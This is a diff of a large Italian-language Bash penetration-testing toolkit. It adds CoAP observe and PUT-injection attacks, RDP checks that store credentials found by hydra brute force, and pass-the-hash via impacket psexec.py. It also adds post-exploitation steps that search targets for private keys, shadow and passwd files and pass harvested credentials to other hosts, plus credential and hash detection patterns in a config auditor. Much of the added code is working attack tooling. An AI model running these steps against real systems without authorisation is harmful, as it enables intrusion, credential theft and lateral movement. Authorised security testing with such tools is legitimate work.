     echo "  Wraps: nmap coap NSE, coap-client (libcoap)"
     echo ""
     echo "Opzioni:"
@@ -3789,37 +4170,105 @@ cmd_coap() {
             found MEDIUM "CoAP:$port — servizio CoAP raggiungibile" || true
     fi
 
+    section "DTLS Bypass Check (porta 5684)"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        local dtls_resp
+        dtls_resp=$(printf '\x40\x01\x00\x01\xbb\x2f\x00\x00' \
+            | nc -u -w 3 "$target" 5684 2>/dev/null | strings | head -3 || true)
+        if [[ -n "$dtls_resp" ]]; then
+            found HIGH "CoAP — porta DTLS 5684 risponde a traffico non-DTLS (possibile bypass DTLS)"
+            echo "$dtls_resp" >> "$OUTDIR/coap_dtls_bypass.txt"
+        else
+            log "CoAP DTLS port 5684: nessuna risposta non-DTLS"
+        fi
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} CoAP DTLS bypass check $target:5684"
+    fi
+
     section "CoAP Service Discovery (coap-client)"
     local coap_bin=""
     tool_ok coap-client   && coap_bin="coap-client"
     tool_ok coap-client-3 && coap_bin="coap-client-3"
 
+    local discovered_resources=()
+
     if [[ -n "$coap_bin" ]]; then
-        # .well-known/core — resource discovery
+        # .well-known/core — resource discovery completo
         run_cmd "coap_discovery" \
             "$coap_bin -m get coap://$target:$port/.well-known/core 2>&1 \
              | tee \"$OUTDIR\"/coap_discovery.txt"
         if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/coap_discovery.txt" ]]; then
             if grep -q "</" "$OUTDIR/coap_discovery.txt" 2>/dev/null; then
                 found HIGH "CoAP:$port — .well-known/core accessibile (no auth)"
-                # Enumera ogni risorsa trovata
-                grep -oP '(?<=<)[^>]+(?=>)' "$OUTDIR/coap_discovery.txt" 2>/dev/null | \
+                # Parsa risorse con metodi supportati
                 while IFS= read -r resource; do
+                    discovered_resources+=("$resource")
                     local res_out="$OUTDIR/coap_res_${resource//\//_}.txt"
                     "$coap_bin" -m get "coap://$target:$port/$resource" \
                         > "$res_out" 2>&1 || true
-                    [[ -s "$res_out" ]] && \
-                        found INFO "CoAP:$port — risorsa leggibile: /$resource"
-                done || true
+                    if [[ -s "$res_out" ]]; then
+                        local methods=""
+                        # Cerca indicatori di metodi nell'output
+                        grep -qi "if=\|rt=\|obs" "$OUTDIR/coap_discovery.txt" 2>/dev/null && methods="GET/OBS"
+                        found INFO "CoAP:$port — risorsa: /$resource [$methods]"
+                    fi
+                done < <(grep -oP '(?<=<)[^>]+(?=>)' "$OUTDIR/coap_discovery.txt" 2>/dev/null || true)
             fi
         fi
 
-        # Test GET su path comuni senza auth
-        for res in "" "version" "config" "status" "info" "settings" "actuators" "sensors"; do
-            run_cmd "coap_get_$res" \
+        # Test GET su path comuni (auth resources, config, status)
+        for res in "" "version" "config" "status" "info" "settings" \
+                   "actuators" "sensors" "auth" "login" "admin"; do
+            run_cmd "coap_get_${res:-root}" \
                 "$coap_bin -m get coap://$target:$port/$res 2>&1 \
                  | tee \"$OUTDIR\"/coap_get_${res:-root}.txt" || true
+            if [[ $DRY_RUN -eq 0 && -s "$OUTDIR/coap_get_${res:-root}.txt" ]]; then
+                case "$res" in
+                    auth|login|admin)
+                        found MEDIUM "CoAP:$port — risorsa sensibile accessibile: /$res"
+                        ;;
+                    config)
+                        found HIGH "CoAP:$port — risorsa /config leggibile senza auth"
+                        ;;
+                esac
+            fi
         done
+
+        # CoAP OBSERVE attack (registra per notifiche senza auth)
+        section "CoAP OBSERVE Attack"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            for obs_res in "sensors" "status" "actuators"; do
+                local obs_out="$OUTDIR/coap_observe_${obs_res}.txt"
+                timeout 8 "$coap_bin" -m get -s 5 \
+                    "coap://$target:$port/$obs_res" > "$obs_out" 2>&1 || true
+                if [[ -s "$obs_out" ]]; then
+                    local obs_lines; obs_lines=$(wc -l < "$obs_out" 2>/dev/null || echo 0)
+                    if [[ $obs_lines -gt 1 ]]; then
+                        found HIGH "CoAP:$port — OBSERVE su /$obs_res: $obs_lines aggiornamenti ricevuti (no auth)"
+                    fi
+                fi
+            done
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} CoAP OBSERVE attack $target:$port"
+        fi
+
+        # Resource injection test (PUT/POST su risorse trovate)
+        section "CoAP Resource Injection (PUT/POST)"
+        if [[ $DRY_RUN -eq 0 && ${#discovered_resources[@]} -gt 0 ]]; then
+            for resource in "${discovered_resources[@]:0:5}"; do
+                local put_resp
+                put_resp=$(timeout 5 "$coap_bin" -m put \
+                    "coap://$target:$port/$resource" \
+                    -e "exa-dune-probe-$(date +%s)" 2>&1 || true)
+                if echo "$put_resp" | grep -qiE "2\.[0-4]|Changed|Created"; then
+                    found CRITICAL "CoAP:$port — PUT su /$resource riuscito SENZA AUTH (injection possibile)"
+                    echo "PUT /$resource OK" >> "$OUTDIR/coap_injection.txt"
+                fi
+            done
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} CoAP resource injection test $target:$port"
+        fi
+
     else
         warn "coap-client non trovato — usa nmap results (apt install libcoap2-bin)"
     fi
@@ -4891,8 +5340,8 @@ cmd_vnc() {
 usage_rdp() {
     echo "Uso: exa-dune rdp <TARGET> [OPTIONS]"
     echo ""
-    echo "  RDP audit — encryption, NLA, brute force, vuln check"
-    echo "  Wraps: nmap rdp NSE, hydra"
+    echo "  RDP audit — encryption, NLA, CredSSP, BlueKeep, brute force"
+    echo "  Wraps: nmap rdp NSE, openssl, hydra, rdesktop/xfreerdp"
     echo ""
     echo "Opzioni:"
     echo "  --port PORT        Porta (default: 3389)"
@@ -4900,12 +5349,15 @@ usage_rdp() {
     echo "  --userlist FILE"
     echo "  --passlist FILE"
     echo "  --threads N        Thread hydra (default: 4)"
+    echo "  --check-nla        Test NLA e CredSSP downgrade"
+    echo "  --screenshot       Tenta cattura schermata login (rdesktop/xfreerdp)"
     echo "  --output DIR"
     echo "  --dry-run"
 }
 
 cmd_rdp() {
     local target="" port=3389 do_brute=1 threads=4
+    local do_check_nla=0 do_screenshot=0
     while [[ $# -gt 0 ]]; do
         case "$1" in
             --port)          _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
@@ -4913,6 +5365,8 @@ cmd_rdp() {
             --userlist)      _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2"; shift 2 ;;
             --passlist)      _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2"; shift 2 ;;
             --threads)       _req_arg "$1" "${2:-}"; threads="$2";     shift 2 ;;
+            --check-nla)     do_check_nla=1;   shift ;;
+            --screenshot)    do_screenshot=1;  shift ;;
             --output)        _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)       DRY_RUN=1;        shift ;;
             --help|-h)       usage_rdp; exit 0 ;;
@@ -4928,15 +5382,86 @@ cmd_rdp() {
     section "Nmap RDP Scripts"
     run_cmd "nmap_rdp" \
         "nmap -p $port \
-         --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-enum-encryption \
+         --script rdp-enum-encryption,rdp-vuln-ms12-020 \
          -oN \"$OUTDIR\"/nmap_rdp.txt $target 2>&1"
     if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/nmap_rdp.txt" ]]; then
         grep -iE "encryption|NLA|security layer|VULNERABLE|MS12" "$OUTDIR/nmap_rdp.txt" 2>/dev/null \
             | tee "$OUTDIR/rdp_summary.txt" || true
         grep -i "VULNERABLE\|MS12-020" "$OUTDIR/nmap_rdp.txt" 2>/dev/null && \
-            found CRITICAL "RDP:$port — VULNERABILE MS12-020" || true
+            found CRITICAL "RDP:$port — VULNERABILE MS12-020 (DoS/possibile RCE)" || true
         grep -iE "security.*none|encryption.*none" "$OUTDIR/nmap_rdp.txt" 2>/dev/null && \
             found HIGH "RDP:$port — RDP Security (no NLA, traffico non cifrato)" || true
+        # Rileva encryption level debole
+        if grep -qiE "rc4.*40|rc4.*56|encryption.*low" "$OUTDIR/nmap_rdp.txt" 2>/dev/null; then
+            found HIGH "RDP:$port — encryption debole rilevata (RC4 40/56-bit)"
+        fi
+    fi
+
+    section "NLA Detection + CredSSP Downgrade Test"
+    if [[ $do_check_nla -eq 1 || $DRY_RUN -eq 1 ]]; then
+        if [[ $DRY_RUN -eq 0 ]]; then
+            if tool_ok openssl; then
+                local ssl_resp
+                ssl_resp=$(echo "QUIT" | timeout 8 openssl s_client \
+                    -connect "${target}:${port}" 2>&1 | head -20 || true)
+                echo "$ssl_resp" > "$OUTDIR/rdp_ssl_probe.txt"
+                if echo "$ssl_resp" | grep -qiE "TLSv1\.[23]|Protocol"; then
+                    found INFO "RDP:$port — TLS supportato (CredSSP probabilmente attivo)"
+                fi
+                if echo "$ssl_resp" | grep -qiE "TLSv1\.0|SSLv3"; then
+                    found HIGH "RDP:$port — TLS 1.0 o SSLv3 in uso (downgrade possibile)"
+                fi
+            fi
+            # Check NLA dal nmap output
+            if [[ -f "$OUTDIR/nmap_rdp.txt" ]]; then
+                if grep -qi "HYBRID\|NLA\|Network Level" "$OUTDIR/nmap_rdp.txt" 2>/dev/null; then
+                    log "RDP:$port — NLA/Hybrid auth rilevata"
+                else
+                    found HIGH "RDP:$port — NLA non richiesto: connessione possibile senza credenziali AD"
+                fi
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} RDP NLA/CredSSP check $target:$port"
+        fi
+    fi
+
+    section "BlueKeep / DejaBlue Banner Check (CVE-2019-0708)"
+    if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/nmap_rdp.txt" ]]; then
+        # Controlla versione OS da nmap per range vulnerabile
+        local os_ver
+        os_ver=$(grep -iE "Windows [0-9]|Windows XP|Windows 7|Windows 2008|Windows 2003" \
+            "$OUTDIR/nmap_rdp.txt" 2>/dev/null | head -1 || true)
+        if [[ -n "$os_ver" ]]; then
+            found INFO "RDP:$port — OS rilevato: $os_ver"
+            if echo "$os_ver" | grep -qiE "Windows XP|Windows 7|Windows 2008|Windows 2003|Windows Vista"; then
+                found HIGH "RDP:$port — OS potenzialmente vulnerabile a BlueKeep CVE-2019-0708: $os_ver"
+            fi
+        fi
+        # Check NSE bluekeep se disponibile
+        run_cmd "nmap_bluekeep" \
+            "nmap -p $port --script rdp-vuln-ms12-020 \
+             -oN \"$OUTDIR\"/nmap_bluekeep.txt $target 2>&1 || true"
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} BlueKeep banner check $target:$port"
+    fi
+
+    section "Screenshot Login (rdesktop/xfreerdp)"
+    if [[ $do_screenshot -eq 1 ]]; then
+        if [[ $DRY_RUN -eq 0 ]]; then
+            if tool_ok xfreerdp; then
+                timeout 10 xfreerdp /v:"${target}:${port}" /u:"" /p:"" \
+                    /cert-ignore /auth-only 2>/dev/null | head -5 || true
+                log "xfreerdp screenshot attempt eseguito (output in log)"
+            elif tool_ok rdesktop; then
+                timeout 10 rdesktop -u "" -p "" "${target}:${port}" \
+                    2>/dev/null | head -5 || true
+                log "rdesktop screenshot attempt eseguito"
+            else
+                warn "xfreerdp/rdesktop non trovati — screenshot saltato"
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} RDP screenshot login $target:$port"
+        fi
     fi
 
     if [[ $do_brute -eq 1 ]]; then
@@ -4949,7 +5474,14 @@ cmd_rdp() {
                  -o \"$OUTDIR\"/hydra_rdp.txt $target rdp 2>&1"
             if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/hydra_rdp.txt" ]]; then
                 grep -i "login:" "$OUTDIR/hydra_rdp.txt" 2>/dev/null | \
-                    while IFS= read -r line; do found HIGH "RDP:$port — $line"; done || true
+                    while IFS= read -r line; do
+                        found HIGH "RDP:$port — $line"
+                        local hu hp
+                        hu=$(echo "$line" | grep -oP 'login:\s*\K\S+' || true)
+                        hp=$(echo "$line" | grep -oP 'password:\s*\K\S+' || true)
+                        [[ -n "$hu" && -n "$hp" ]] && \
+                            _cred_store_add rdp "$target" "$port" "$hu" "$hp" "rdp:hydra"
+                    done || true
             fi
         fi
     fi
@@ -5391,7 +5923,7 @@ usage_post() {
     echo "Uso: exa-dune post <TARGET> <METHOD> [OPTIONS]"
     echo ""
     echo "  Post-exploitation su device embedded dopo accesso ottenuto"
-    echo "  Wraps: ssh, sshpass, expect, curl, smbclient, nc, python3"
+    echo "  Wraps: ssh, sshpass, expect, curl, smbclient, nc, python3, impacket"
     echo ""
     echo "Metodi:"
     echo "  shell    Post-exploit via SSH o Telnet (recon automatizzata)"
@@ -5400,18 +5932,23 @@ usage_post() {
     echo "  smb      Post-exploit via SMB (share dump, cred search)"
     echo "  snmp     Post-exploit via SNMP write (SET commands)"
     echo "  revshell Attacchi reverse shell multi-vettore"
+    echo "  privesc  Linux privilege escalation check (SUID, sudo, cron)"
+    echo "  exfil    Ricerca file sensibili (*.conf, *.key, *.db)"
     echo ""
     echo "Opzioni comuni:"
-    echo "  --user USER        Username per autenticazione"
-    echo "  --pass PASS        Password per autenticazione"
-    echo "  --port PORT        Porta del servizio (default: auto per metodo)"
-    echo "  --proto PROTO      ssh|telnet (per metodo shell, default: auto)"
-    echo "  --lhost IP         IP listener per reverse shell"
-    echo "  --lport PORT       Porta listener (default: 4444)"
-    echo "  --payload TYPE     bash|busybox|mkfifo|python|perl|wget (default: auto)"
-    echo "  --persist          Abilita meccanismi di persistenza (default: off)"
-    echo "  --scheme SCHEME    http|https per metodo web (default: http)"
-    echo "  --web-port PORT    Porta web (default: 80)"
+    echo "  --user USER          Username per autenticazione"
+    echo "  --pass PASS          Password per autenticazione"
+    echo "  --port PORT          Porta del servizio (default: auto per metodo)"
+    echo "  --proto PROTO        ssh|telnet (per metodo shell, default: auto)"
+    echo "  --lhost IP           IP listener per reverse shell"
+    echo "  --lport PORT         Porta listener (default: 4444)"
+    echo "  --payload TYPE       bash|busybox|mkfifo|python|perl|wget (default: auto)"
+    echo "  --persist            Abilita meccanismi di persistenza (default: off)"
+    echo "  --scheme SCHEME      http|https per metodo web (default: http)"
+    echo "  --web-port PORT      Porta web (default: 80)"
+    echo "  --privesc            Linux privilege escalation check (con metodo shell)"
+    echo "  --pass-the-hash HASH Windows PTH via impacket psexec.py"
+    echo "  --exfil              Cerca file sensibili (con metodo shell)"
     echo "  --output DIR"
     echo "  --dry-run"
 }
@@ -6155,23 +6692,27 @@ cmd_post() {
     local user="" pass="" port="" proto="auto"
     local lhost="" lport=4444 payload_type="auto"
     local persist=0 scheme="http" web_port=80
+    local do_privesc=0 do_exfil=0 pth_hash=""
 
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --user)      _req_arg "$1" "${2:-}"; user="$2";         shift 2 ;;
-            --pass)      _req_arg "$1" "${2:-}"; pass="$2";         shift 2 ;;
-            --port)      _req_arg "$1" "${2:-}"; port="$2";         shift 2 ;;
-            --proto)     _req_arg "$1" "${2:-}"; proto="$2";        shift 2 ;;
-            --lhost)     _req_arg "$1" "${2:-}"; lhost="$2";        shift 2 ;;
-            --lport)     _req_arg "$1" "${2:-}"; lport="$2";        shift 2 ;;
-            --payload)   _req_arg "$1" "${2:-}"; payload_type="$2"; shift 2 ;;
-            --persist)   persist=1;         shift ;;
-            --scheme)    _req_arg "$1" "${2:-}"; scheme="$2";       shift 2 ;;
-            --web-port)  _req_arg "$1" "${2:-}"; web_port="$2";     shift 2 ;;
-            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";  shift 2 ;;
-            --dry-run)   DRY_RUN=1;         shift ;;
-            --help|-h)   usage_post; exit 0 ;;
-            -*)          err "Opzione sconosciuta: $1"; usage_post; exit 1 ;;
+            --user)           _req_arg "$1" "${2:-}"; user="$2";         shift 2 ;;
+            --pass)           _req_arg "$1" "${2:-}"; pass="$2";         shift 2 ;;
+            --port)           _req_arg "$1" "${2:-}"; port="$2";         shift 2 ;;
+            --proto)          _req_arg "$1" "${2:-}"; proto="$2";        shift 2 ;;
+            --lhost)          _req_arg "$1" "${2:-}"; lhost="$2";        shift 2 ;;
+            --lport)          _req_arg "$1" "${2:-}"; lport="$2";        shift 2 ;;
+            --payload)        _req_arg "$1" "${2:-}"; payload_type="$2"; shift 2 ;;
+            --persist)        persist=1;         shift ;;
+            --scheme)         _req_arg "$1" "${2:-}"; scheme="$2";       shift 2 ;;
+            --web-port)       _req_arg "$1" "${2:-}"; web_port="$2";     shift 2 ;;
+            --privesc)        do_privesc=1;      shift ;;
+            --pass-the-hash)  _req_arg "$1" "${2:-}"; pth_hash="$2";    shift 2 ;;
+            --exfil)          do_exfil=1;        shift ;;
+            --output)         _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";  shift 2 ;;
+            --dry-run)        DRY_RUN=1;         shift ;;
+            --help|-h)        usage_post; exit 0 ;;
+            -*)               err "Opzione sconosciuta: $1"; usage_post; exit 1 ;;
             *)
                 if [[ -z "$target" ]];  then target="$1"
                 elif [[ -z "$method" ]]; then method="$1"
@@ -6181,7 +6722,7 @@ cmd_post() {
     done
 
     [[ -z "$target" ]] && { err "TARGET mancante"; usage_post; exit 1; }
-    [[ -z "$method" ]] && { err "METHOD mancante (shell/web/ftp/smb/snmp/revshell)"; usage_post; exit 1; }
+    [[ -z "$method" ]] && { err "METHOD mancante (shell/web/ftp/smb/snmp/revshell/privesc/exfil)"; usage_post; exit 1; }
     validate_target "$target"
     check_root
     setup_outdir "$target" "post_${method}"
@@ -6213,11 +6754,110 @@ cmd_post() {
             _post_revshell "$target" "$user" "$pass" "$lhost" "$lport" \
                 "$payload_type" "$scheme" "$web_port" "$proto"
             ;;
+        privesc)
+            section "Linux Privilege Escalation Check"
+            if [[ $DRY_RUN -eq 0 ]]; then
+                # SUID binaries inusuali
+                log "Ricerca SUID binaries inusuali..."
+                run_cmd "suid_check" \
+                    "find / -perm -4000 -type f 2>/dev/null | grep -vE '^/(bin|sbin|usr/bin|usr/sbin)' \
+                     | tee \"$OUTDIR\"/post_suid.txt"
+                if [[ -s "$OUTDIR/post_suid.txt" ]]; then
+                    local nsuid; nsuid=$(wc -l < "$OUTDIR/post_suid.txt" 2>/dev/null || echo 0)
+                    found HIGH "PrivEsc — $nsuid SUID binaries inusuali trovati (vedi post_suid.txt)"
+                fi
+                # Sudo misconfig
+                log "Check sudo misconfig..."
+                local sudo_out
+                sudo_out=$(sudo -l 2>/dev/null | tee "$OUTDIR/post_sudo.txt" || true)
+                if echo "$sudo_out" | grep -qiE "ALL|NOPASSWD|(root)"; then
+                    found HIGH "PrivEsc — sudo misconfiguration rilevata (vedi post_sudo.txt)"
+                fi
+                # Cron world-writable
+                run_cmd "cron_check" \
+                    "ls -la /etc/cron* /var/spool/cron* 2>/dev/null | tee \"$OUTDIR\"/post_cron.txt"
+                if find /etc/cron* /var/spool/cron* -perm -o+w -type f 2>/dev/null | grep -q .; then
+                    found HIGH "PrivEsc — file cron world-writable trovati"
+                fi
+                # Lateral movement via credenziali store
+                if [[ -n "$CRED_STORE" && -f "$CRED_STORE" ]]; then
+                    _cred_propagate "$target"
+                fi
+            else
+                echo -e "${CYAN}[DRY-RUN]${NC} PrivEsc check: SUID, sudo, cron su $target"
+            fi
+            ;;
+        exfil)
+            section "Data Exfiltration — Ricerca file sensibili"
+            if [[ $DRY_RUN -eq 0 ]]; then
+                run_cmd "exfil_search" \
+                    "find / -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.pem' \
+                     -o -name '*.key' -o -name '*.db' -o -name '*.sqlite' \
+                     -o -name 'shadow' -o -name 'passwd' \) \
+                     -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null \
+                     | tee \"$OUTDIR\"/post_exfil_list.txt"
+                if [[ -s "$OUTDIR/post_exfil_list.txt" ]]; then
+                    local nfiles; nfiles=$(wc -l < "$OUTDIR/post_exfil_list.txt" || echo 0)
+                    found HIGH "Exfil — $nfiles file sensibili trovati (vedi post_exfil_list.txt)"
+                fi
+            else
+                echo -e "${CYAN}[DRY-RUN]${NC} Exfil search *.conf *.key *.db su $target"
+            fi
+            ;;
         *)
             err "Metodo sconosciuto: $method"
             usage_post; exit 1
             ;;
     esac
+
+    # Pass-the-Hash via impacket (se --pass-the-hash specificato)
+    if [[ -n "$pth_hash" ]]; then
+        section "Pass-the-Hash (impacket psexec.py)"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            if tool_ok psexec.py; then
+                run_cmd "pth_psexec" \
+                    "psexec.py -hashes :${pth_hash} ${user:-Administrator}@${target} \
+                     2>&1 | tee \"$OUTDIR\"/post_pth_psexec.txt"
+                grep -qi "Authenticated\|cmd.exe\|\\\$IPC" "$OUTDIR/post_pth_psexec.txt" 2>/dev/null && \
+                    found CRITICAL "PTH — psexec.py riuscito con hash NTLM su $target"
+            elif tool_ok smbexec.py; then
+                run_cmd "pth_smbexec" \
+                    "smbexec.py -hashes :${pth_hash} ${user:-Administrator}@${target} \
+                     2>&1 | tee \"$OUTDIR\"/post_pth_smbexec.txt"
+            else
+                warn "impacket (psexec.py/smbexec.py) non trovato — PTH saltato"
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} Pass-the-Hash via impacket $target (hash: ${pth_hash:0:8}...)"
+        fi
+    fi
+
+    # Privesc automatico (se --privesc con metodi shell/smb)
+    if [[ $do_privesc -eq 1 && "$method" =~ ^(shell|smb)$ ]]; then
+        section "Linux PrivEsc Check (aggiuntivo)"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            log "SUID, sudo, world-writable service files..."
+            find / -perm -4000 -type f 2>/dev/null | grep -vE '^/(bin|sbin|usr/(bin|sbin))' \
+                >> "$OUTDIR/post_suid.txt" 2>/dev/null || true
+            sudo -l 2>/dev/null >> "$OUTDIR/post_sudo.txt" || true
+            find /etc/systemd /etc/init.d -perm -o+w -type f 2>/dev/null \
+                | tee "$OUTDIR/post_writable_services.txt" || true
+            [[ -s "$OUTDIR/post_writable_services.txt" ]] && \
+                found HIGH "PrivEsc — service file world-writable (vedi post_writable_services.txt)"
+        fi
+    fi
+
+    # Exfil automatico (se --exfil)
+    if [[ $do_exfil -eq 1 && "$method" != "exfil" ]]; then
+        section "Exfiltration (aggiuntivo)"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            find / -type f \( -name '*.pem' -o -name '*.key' -o -name '*.p12' \) \
+                -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null \
+                | tee "$OUTDIR/post_keys.txt" || true
+            [[ -s "$OUTDIR/post_keys.txt" ]] && \
+                found CRITICAL "Exfil — chiavi crittografiche trovate (vedi post_keys.txt)"
+        fi
+    fi
 
     ok "Post-exploitation completato → $OUTDIR"
 }
@@ -7337,6 +7977,12 @@ cmd_pipeline() {
         _timeline_event "FASE 4 SKIP — nessuna credenziale"
     fi
 
+    # Propagazione finale credenziali
+    if [[ "${PROPAGATE_CREDS:-0}" -eq 1 && $DRY_RUN -eq 0 ]]; then
+        _cred_propagate "$target"
+    fi
+    _cred_store_summary
+
     # ── FASE 5: REPORT PDF ───────────────────────────────────
     section "FASE 5 — GENERAZIONE REPORT PDF"
     _timeline_event "FASE 5 START — generazione report"
@@ -7648,6 +8294,12 @@ cmd_auto() {
         if command -v notify-send &>/dev/null; then
             notify-send "PentestKit" "Auto-assessment avviato: $target ($profile)" 2>/dev/null || true
         fi
+        # Propagazione finale credenziali per profili IoT/VoIP
+        if [[ "${PROPAGATE_CREDS:-0}" -eq 1 || \
+              "$profile" == "voip-gateway" || "$profile" == "ip-camera" ]]; then
+            _cred_propagate "$target"
+        fi
+        _cred_store_summary
     fi
 }
 
@@ -8268,6 +8920,23 @@ HTMLEOF
                 has_creds=1
             done < "$cf"
         done < <(find "$outdir" \( -name "rtsp_digest_creds.txt" -o -name "onvif_creds.txt" \) -print0 2>/dev/null)
+        # Creds da credential store JSON
+        local creds_json_f; creds_json_f=$(find "$outdir" -maxdepth 2 -name "creds.json" 2>/dev/null | head -1)
+        if [[ -n "$creds_json_f" && -f "$creds_json_f" ]]; then
+            export CRED_FILE="$creds_json_f"
+            python3 - <<'PYEOF' 2>/dev/null | while IFS='|' read -r svc host port user pass src; do
+import json, os
+f = os.environ['CRED_FILE']
+with open(f) as fh:
+    d = json.load(fh)
+for c in d['credentials']:
+    print(f"{c['service']}|{c['host']}|{c['port']}|{c['user']}|{c['pass']}|{c['source']}")
+PYEOF
+                echo "<tr><td><span class='tag'>$src</span></td><td>${svc}:${port}</td><td><code>${user}:${pass} @ ${host}</code></td></tr>"
+                has_creds=1
+            done || true
+            unset CRED_FILE
+        fi
         [[ $has_creds -eq 0 ]] && echo "<tr><td colspan='3'>Nessuna credenziale trovata.</td></tr>"
         echo "</table>"
 
@@ -10292,7 +10961,7 @@ cmd_voip_enum() {
 usage_config_audit() {
     echo "Uso: exa-dune config-audit <DIR_O_FILE> [OPTIONS]"
     echo ""
-    echo "  Analisi file di configurazione: credenziali, SNMP deboli, SIP, certificati."
+    echo "  Analisi file configurazione: credenziali, hash, chiavi, CIS checks, parser strutturati."
     echo ""
     echo "Opzioni:"
     echo "  --recursive    Analizza ricorsivamente la directory"
@@ -10354,10 +11023,12 @@ cmd_config_audit() {
         # Salta file binari (check rapido)
         file "$cf" 2>/dev/null | grep -qiE "ELF|binary|data|image|archive" && continue
         local fname; fname=$(basename "$cf")
+        local fext="${fname##*.}"
 
-        # 1. Credenziali in chiaro
+        # 1. Credenziali in chiaro (testo generico)
         local cred_matches
-        cred_matches=$(grep -niP '(password|passwd|secret)\s*[=:]\s*\S+' "$cf" 2>/dev/null | grep -v "^[[:space:]]*#" | head -10 || true)
+        cred_matches=$(grep -niP '(password|passwd|secret|token|apikey|api_key)\s*[=:]\s*\S+' \
+            "$cf" 2>/dev/null | grep -v "^[[:space:]]*#" | head -10 || true)
         if [[ -n "$cred_matches" ]]; then
             found HIGH "CONFIG: credenziali in chiaro in $cf"
             echo "$cred_matches" | while IFS= read -r m; do
@@ -10366,21 +11037,138 @@ cmd_config_audit() {
             ((total_findings++)) || true
         fi
 
-        # 2. Community SNMP deboli
-        if grep -qiP 'community\s+(public|private|community)' "$cf" 2>/dev/null; then
-            found HIGH "CONFIG: community SNMP debole (public/private) in $cf"
+        # 2. Parser strutturati (JSON, XML, YAML, INI)
+        case "$fext" in
+            json)
+                if tool_ok python3; then
+                    local json_creds
+                    json_creds=$(python3 -c "
+import json, sys
+try:
+    d = json.load(open('$cf'))
+except: sys.exit(0)
+def walk(obj, path=''):
+    if isinstance(obj, dict):
+        for k, v in obj.items():
+            walk(v, path + '/' + str(k))
+    elif isinstance(obj, list):
+        for i, v in enumerate(obj):
+            walk(v, path + '[' + str(i) + ']')
+    elif isinstance(obj, str) and any(x in path.lower() for x in ['password','secret','key','token','pass']):
+        print(path + ' = ' + str(obj)[:80])
+walk(d)
+" 2>/dev/null || true)
+                    if [[ -n "$json_creds" ]]; then
+                        found HIGH "CONFIG JSON: possibili credenziali in $cf"
+                        echo "$json_creds" | while IFS= read -r m; do found HIGH "  JSON → $m"; done
+                        ((total_findings++)) || true
+                    fi
+                fi
+                ;;
+            xml)
+                local xml_creds
+                xml_creds=$(grep -oP '(?<=password>)[^<]+|(?<=passwd>)[^<]+|(?<=secret>)[^<]+' \
+                    "$cf" 2>/dev/null | grep -v '^\s*$' | head -5 || true)
+                if [[ -n "$xml_creds" ]]; then
+                    found HIGH "CONFIG XML: possibili credenziali in $cf"
+                    echo "$xml_creds" | while IFS= read -r m; do found HIGH "  XML → $m"; done
+                    ((total_findings++)) || true
+                fi
+                ;;
+            yaml|yml)
+                local yaml_creds
+                yaml_creds=$(grep -P '^\s*password\s*:\s*\S+|^\s*secret\s*:\s*\S+|^\s*token\s*:\s*\S+' \
+                    "$cf" 2>/dev/null | grep -v '#' | head -5 || true)
+                if [[ -n "$yaml_creds" ]]; then
+                    found HIGH "CONFIG YAML: possibili credenziali in $cf"
+                    echo "$yaml_creds" | while IFS= read -r m; do found HIGH "  YAML → $m"; done
+                    ((total_findings++)) || true
+                fi
+                # Sezioni credentials/security in INI/CFG
+                ;;
+            ini|cfg|conf)
+                if grep -qiE '^\[credentials\]|^\[security\]|^\[auth\]' "$cf" 2>/dev/null; then
+                    found MEDIUM "CONFIG INI: sezione [credentials]/[security]/[auth] trovata in $cf"
+                    ((total_findings++)) || true
+                fi
+                ;;
+        esac
+
+        # 3. Classificazione hash password
+        if grep -qP '\$1\$[A-Za-z0-9./]{8,}\$' "$cf" 2>/dev/null; then
+            found MEDIUM "CONFIG: hash MD5crypt (\$1\$) in $cf — algoritmo DEBOLE"
+            ((total_findings++)) || true
+        fi
+        if grep -qP '\$2[ab]\$[0-9]{2}\$' "$cf" 2>/dev/null; then
+            found INFO "CONFIG: hash bcrypt (\$2a\$/\$2b\$) in $cf — algoritmo forte"
+        fi
+        if grep -qP '\$5\$[A-Za-z0-9./]+\$' "$cf" 2>/dev/null; then
+            found LOW "CONFIG: hash SHA-256crypt (\$5\$) in $cf"
+        fi
+        if grep -qP '\$6\$[A-Za-z0-9./]+\$' "$cf" 2>/dev/null; then
+            found LOW "CONFIG: hash SHA-512crypt (\$6\$) in $cf"
+        fi
+        # DES 13 char (vecchio /etc/passwd)
+        if grep -qP '^[a-z_][a-z0-9_-]{0,31}:[A-Za-z0-9./]{13}:' "$cf" 2>/dev/null; then
+            found HIGH "CONFIG: hash DES (13 char, vecchio stile) in $cf — MOLTO DEBOLE"
+            ((total_findings++)) || true
+        fi
+        # Plaintext in campo password (no $ prefix, non vuoto)
+        local plain_pass
+        plain_pass=$(grep -iP '^password\s*=\s*[^$\s]{4,}|^passwd\s*=\s*[^$\s]{4,}' \
+            "$cf" 2>/dev/null | head -3 || true)
+        if [[ -n "$plain_pass" ]]; then
+            found CRITICAL "CONFIG: password PLAINTEXT (no hash) in $cf"
